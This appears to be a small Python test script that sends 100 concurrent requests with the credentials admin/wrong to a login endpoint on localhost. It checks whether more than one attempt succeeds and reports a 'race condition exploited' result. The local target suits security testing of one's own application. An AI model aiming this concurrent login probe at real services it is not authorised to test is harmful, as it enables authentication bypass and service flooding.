#!/usr/bin/env python3
import concurrent.futures
import requests

TARGET = "http://localhost:9000/login"
METHOD = "GET"
DATA = {'username': 'admin', 'password': 'wrong'}
THREADS = 100

def hit(i):
    try:
        if METHOD == "POST":
            r = requests.post(TARGET, data=DATA, timeout=10)
        else:
            r = requests.get(TARGET, params=DATA, timeout=10)
        return r.status_code
    except Exception as e:
        return str(e)[:60]

def main():
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=THREADS) as ex:
        for res in ex.map(hit, range(THREADS)):
            results.append(res)
    ok = sum(1 for r in results if r == 200)
    print("Status codes:", set(results))
    print("Successes: %d/%d" % (ok, THREADS))
    if ok > 1:
        print("[!] RACE CONDITION EXPLOITED")
    else:
        print("[+] No race condition")

if __name__ == "__main__":
    main()
